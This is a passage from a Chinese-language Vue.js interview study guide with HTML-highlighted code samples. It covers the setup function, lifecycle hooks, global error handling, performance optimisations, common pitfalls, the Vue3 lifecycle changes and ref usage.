<span class="token punctuation">}</span>
</code></pre></div><p><strong><code>setup</code>和<code>created</code>谁先执行？</strong></p> <ul><li><code>beforeCreate</code>:组件被创建出来，组件的<code>methods</code>和<code>data</code>还没初始化好</li> <li><code>setup</code>：在<code>beforeCreate</code>和<code>created</code>之间执行</li> <li><code>created</code>:组件被创建出来，组件的<code>methods</code>和<code>data</code>已经初始化好了</li></ul> <blockquote><p>由于在执行<code>setup</code>的时候，<code>created</code>还没有创建好，所以在<code>setup</code>函数内我们是无法使用<code>data</code>和<code>methods</code>的。所以<code>vue</code>为了让我们避免错误的使用，直接将<code>setup</code>函数内的<code>this</code>执行指向<code>undefined</code></p></blockquote> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> ref <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;vue&quot;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token comment">// setup函数是组合api的入口函数，注意在组合api中定义的变量或者方法，要在template响应式需要return{}出去</span>
  <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      count<span class="token punctuation">.</span>value <span class="token operator">+=</span><span class="token number">1</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>count<span class="token punctuation">,</span>myFn<span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  
<span class="token punctuation">}</span>
</code></pre></div><ol start="5"><li>其他问题</li></ol> <ul><li><strong>什么是vue生命周期？</strong>  Vue 实例从创建到销毁的过程，就是生命周期。从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、销毁等一系列过程，称之为 <code>Vue</code> 的生命周期。</li> <li><strong>vue生命周期的作用是什么？</strong> 它的生命周期中有多个事件钩子，让我们在控制整个Vue实例的过程时更容易形成好的逻辑。</li> <li><strong>vue生命周期总共有几个阶段？</strong> 它可以总共分为<code>8</code>个阶段：创建前/后、载入前/后、更新前/后、销毁前/销毁后。</li> <li><strong>第一次页面加载会触发哪几个钩子？</strong> 会触发下面这几个<code>beforeCreate</code>、<code>created</code>、<code>beforeMount</code>、<code>mounted</code> 。</li> <li><strong>你的接口请求一般放在哪个生命周期中？</strong> 接口请求一般放在<code>mounted</code>中，但需要注意的是服务端渲染时不支持<code>mounted</code>，需要放到<code>created</code>中</li> <li><strong>DOM 渲染在哪个周期中就已经完成？</strong> 在<code>mounted</code>中，
<ul><li>注意 <code>mounted</code> 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 <code>vm.$nextTick</code> 替换掉 <code>mounted</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code>  <span class="token function-variable function">mounted</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Code that will run only after the</span>
        <span class="token comment">// entire view has been rendered</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
</code></pre></div></li></ul> <h3 id="如何统一监听vue组件报错"><a href="#如何统一监听vue组件报错" class="header-anchor">#</a> 如何统一监听Vue组件报错</h3> <ul><li><strong>window.onerror</strong> <ul><li>全局监听所有<code>JS</code>错误，包括异步错误</li> <li>但是它是<code>JS</code>级别的，识别不了<code>Vue</code>组件信息，<code>Vue</code>内部的错误还是用<code>Vue</code>来监听</li> <li>捕捉一些<code>Vue</code>监听不到的错误</li></ul></li> <li><strong>errorCaptured生命周期</strong> <ul><li>监听所有<strong>下级组件</strong>的错误</li> <li>返回<code>false</code>会阻止向上传播到<code>window.onerror</code></li></ul></li> <li><strong>errorHandler配置</strong> <ul><li><code>Vue</code>全局错误监听，所有组件错误都会汇总到这里</li> <li>但<code>errorCaptured</code>返回<code>false</code>，不会传播到这里</li> <li><code>window.onerror</code>和<code>errorHandler</code>互斥，<code>window.onerror</code>不会在被触发，这里都是全局错误监听了</li></ul></li> <li><strong>异步错误</strong> <ul><li>异步回调里的错误，<code>errorHandler</code>监听不到</li> <li>需要使用<code>window.onerror</code></li></ul></li> <li><strong>总结</strong> <ul><li>实际工作中，三者结合使用</li> <li><code>promise</code>（<code>promise</code>没有被<code>catch</code>的报错，使用<code>onunhandledrejection</code>监听）和<code>setTimeout</code>异步，<code>vue</code>里面监听不了</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;unhandledrejection&quot;</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token comment">// 捕获 Promise 没有 catch 的错误</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'unhandledrejection----'</span><span class="token punctuation">,</span> event<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'错误信息'</span><span class="token punctuation">)</span>
<span class="token comment">// .catch(e =&gt; console.info(e)) // catch 住了，就不会被 unhandledrejection 捕获</span>
</code></pre></div><ul><li><code>errorCaptured</code>监听一些重要的、有风险组件的错误</li> <li><code>window.onerror</code>和<code>errorCaptured</code>候补全局监听</li></ul></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// main.js</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">createApp</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span>

<span class="token comment">// 所有组件错误都会汇总到这里</span>
<span class="token comment">// window.onerror和errorHandler互斥，window.onerror不会在被触发，这里都是全局错误监听了</span>
<span class="token comment">// 阻止向window.onerror传播</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">.</span><span class="token function-variable function">errorHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'errorHandler----'</span><span class="token punctuation">,</span> error<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> info<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 在app.vue最上层中监控全局组件</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">/**
     * msg:错误的信息
     * source:哪个文件
     * line:行
     * column:列
     * error:错误的对象
     */</span>
    <span class="token comment">// 可以监听一切js的报错， try...catch 捕获的 error ，无法被 window.onerror 监听到</span>
    window<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> source<span class="token punctuation">,</span> line<span class="token punctuation">,</span> column<span class="token punctuation">,</span> error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'window.onerror----'</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> source<span class="token punctuation">,</span> line<span class="token punctuation">,</span> column<span class="token punctuation">,</span> error<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 用addEventListener跟window.onerror效果一样，参数不一样</span>
    <span class="token comment">// window.addEventListener('error', event =&gt; {</span>
    <span class="token comment">//   console.info('window error', event)</span>
    <span class="token comment">// })</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">errorCaptured</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">errInfo<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> info</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'errorCaptured----'</span><span class="token punctuation">,</span> errInfo<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> info<span class="token punctuation">)</span>
    <span class="token comment">// 返回false会阻止向上传播到window.onerror</span>
    <span class="token comment">// 返回false会阻止传播到errorHandler</span>
    <span class="token comment">// return false</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// ErrorDemo.vue</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'ErrorDemo'</span><span class="token punctuation">,</span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">num</span><span class="token operator">:</span> <span class="token number">100</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token function">clickHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">num</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 报错</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'catch.....'</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span>
        <span class="token comment">// try...catch 捕获的 error ，无法被 window.onerror 监听到</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">num</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 报错</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 被errorCaptured捕获</span>
    <span class="token comment">// throw new Error('mounted 报错')</span>

    <span class="token comment">// 异步报错，errorHandler、errorCaptured监听不到，vue对异步报错监听不了，需要使用window.onerror来做</span>
    <span class="token comment">// setTimeout(() =&gt; {</span>
    <span class="token comment">//     throw new Error('setTimeout 报错')</span>
    <span class="token comment">// }, 1000)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="在实际工作中-你对vue做过哪些优化"><a href="#在实际工作中-你对vue做过哪些优化" class="header-anchor">#</a> 在实际工作中，你对Vue做过哪些优化</h3> <ul><li><strong>v-if和v-show</strong> <ul><li><code>v-if</code>彻底销毁组件</li> <li><code>v-show</code>使用<code>dispaly</code>切换<code>none</code></li> <li>实际工作中大部分情况下使用<code>v-if</code>就好，不要过渡优化</li></ul></li> <li><strong>v-for使用key</strong> <ul><li><code>key</code>不要使用<code>index</code></li></ul></li> <li><strong>使用computed缓存</strong></li> <li><strong>keep-alive缓存组件</strong> <ul><li>频繁切换的组件 <code>tabs</code></li> <li>不要乱用，缓存会占用更多的内存</li></ul></li> <li><strong>异步组件</strong> <ul><li>针对体积较大的组件，如编辑器、复杂表格、复杂表单</li> <li>拆包，需要时异步加载，不需要时不加载</li> <li>减少主包体积，首页会加载更快</li> <li>演示</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- index.vue --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Child</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Child</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> defineAsyncComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'AsyncComponent'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">components</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token comment">// child体积大 异步加载才有意义</span>
    <span class="token comment">// defineAsyncComponent vue3的写法</span>
    <span class="token literal-property property">Child</span><span class="token operator">:</span> <span class="token function">defineAsyncComponent</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment">/* webpackChunkName: &quot;async-child&quot; */</span> <span class="token string">'./Child.vue'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> child<span class="token punctuation">.</span>vue <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>template<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token keyword">async</span> component child<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Child'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div></li> <li><strong>路由懒加载</strong> <ul><li>项目比较大，拆分路由，保证首页先加载</li> <li>演示</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Home'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">component</span><span class="token operator">:</span> Home <span class="token comment">// 直接加载</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/about'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'About'</span><span class="token punctuation">,</span>
    <span class="token comment">// route level code-splitting</span>
    <span class="token comment">// this generates a separate chunk (about.[hash].js) for this route</span>
    <span class="token comment">// which is lazy-loaded when the route is visited.</span>
    <span class="token comment">// 路由懒加载</span>
    <span class="token function-variable function">component</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">import</span><span class="token punctuation">(</span><span class="token comment">/* webpackChunkName: &quot;about&quot; */</span> <span class="token string">'../views/About.vue'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre></div></li> <li><strong>服务端SSR</strong> <ul><li>可使用<code>Nuxt.js</code></li> <li>按需优化，使用<code>SSR</code>成本比较高</li></ul></li> <li>实际工作中你遇到积累的业务的优化经验也可以说</li></ul> <p><strong>连环问：你在使用Vue过程中遇到过哪些坑</strong></p> <ul><li><strong>内存泄露</strong> <ul><li>全局变量、全局事件、全局定时器没有销毁</li> <li>自定义事件没有销毁</li></ul></li> <li><strong>Vue2响应式的缺陷(vue3不在有)</strong> <ul><li><code>data</code>后续新增属性用<code>Vue.set</code></li> <li><code>data</code>删除属性用<code>Vue.delete</code></li> <li><code>Vue2</code>并不支持数组下标的响应式。也就是说<code>Vue2</code>检测不到通过下标更改数组的值 <code>arr[index] = value</code></li></ul></li> <li><strong>路由切换时scroll会重新回到顶部</strong> <ul><li>这是<code>SPA</code>应用的通病，不仅仅是<code>vue</code></li> <li>如，列表页滚动到第二屏，点击详情页，再返回列表页，此时列表页组件会重新渲染回到了第一页</li> <li><strong>解决方案</strong> <ul><li>在列表页缓存翻页过的数据和<code>scrollTop</code>的值</li> <li>当再次返回列表页时，渲染列表组件，执行<code>scrollTo(xx)</code></li> <li>终极方案：<code>MPA</code>(多页面) + <code>App WebView</code>(可以打开多个页面不会销毁之前的)</li></ul></li></ul></li> <li>日常遇到问题记录总结，下次面试就能用到</li></ul> <h2 id="_5-vue3"><a href="#_5-vue3" class="header-anchor">#</a> 5 Vue3</h2> <h3 id="vue3-对-vue2-有什么优势"><a href="#vue3-对-vue2-有什么优势" class="header-anchor">#</a> vue3 对 vue2 有什么优势</h3> <ul><li>性能更好（编译优化、使用<code>proxy</code>等）</li> <li>体积更小</li> <li>更好的<code>TS</code>支持</li> <li>更好的代码组织</li> <li>更好的逻辑抽离</li> <li>更多新功能</li></ul> <h3 id="vue3-和-vue2-的生命周期有什么区别"><a href="#vue3-和-vue2-的生命周期有什么区别" class="header-anchor">#</a> vue3 和 vue2 的生命周期有什么区别</h3> <p><strong><code>Options API</code>生命周期</strong></p> <ul><li><code>beforeDestroy</code>改为<code>beforeUnmount</code></li> <li><code>destroyed</code>改为<code>umounted</code></li> <li>其他沿用<code>vue2</code>生命周期</li></ul> <p><strong><code>Composition API</code>生命周期</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> onBeforeMount<span class="token punctuation">,</span> onMounted<span class="token punctuation">,</span> onBeforeUpdate<span class="token punctuation">,</span> onUpdated<span class="token punctuation">,</span> onBeforeUnmount<span class="token punctuation">,</span> onUnmounted <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'LifeCycles'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">msg</span><span class="token operator">:</span> String
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">// setup等于 beforeCreate 和 created</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setup'</span><span class="token punctuation">)</span>

        <span class="token function">onBeforeMount</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onBeforeMount'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onMounted'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">onBeforeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onBeforeUpdate'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">onUpdated</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onUpdated'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">onBeforeUnmount</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onBeforeUnmount'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">onUnmounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onUnmounted'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>

    <span class="token comment">// 兼容vue2生命周期 options API和composition API生命周期二选一</span>
    <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeCreate'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'created'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">beforeMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeMount'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mounted'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">beforeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeUpdate'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">updated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'updated'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">// beforeDestroy 改名</span>
    <span class="token function">beforeUnmount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeUnmount'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">// destroyed 改名</span>
    <span class="token function">unmounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'unmounted'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="如何理解composition-api和options-api"><a href="#如何理解composition-api和options-api" class="header-anchor">#</a> 如何理解Composition API和Options API</h3> <p><strong>composition API对比Option API</strong></p> <ul><li>Composition API带来了什么
<ul><li>更好的代码组织</li> <li>更好的逻辑复用</li> <li>更好的类型推导</li></ul></li> <li>Composition API和Options API如何选择
<ul><li>不建议共用，会引起混乱</li> <li>小型项目、业务逻辑简单，用<code>Option API</code>成本更小一些</li> <li>中大型项目、逻辑复杂，用<code>Composition API</code></li></ul></li></ul> <h3 id="ref如何使用"><a href="#ref如何使用" class="header-anchor">#</a> ref如何使用</h3> <p><strong>ref</strong></p> <ul><li>生成值类型的响应式数据</li> <li>可用于模板和<code>reactive</code></li> <li>通过<code>.value</code>修改值</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>ref demo {{ageRef}} {{state.name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> ref<span class="token punctuation">,</span> reactive <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Ref'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> ageRef <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token comment">// 值类型 响应式</span>
        <span class="token keyword">const</span> nameRef <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>

        <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> nameRef
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ageRef'</span><span class="token punctuation">,</span> ageRef<span class="token punctuation">.</span>value<span class="token punctuation">)</span>

            ageRef<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">25</span> <span class="token comment">// .value 修改值</span>
            nameRef<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'testA'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            ageRef<span class="token punctuation">,</span>
            state
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- ref获取dom节点 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>elemRef<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>我是一行文字<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> ref<span class="token punctuation">,</span> onMounted <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'RefTemplate'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
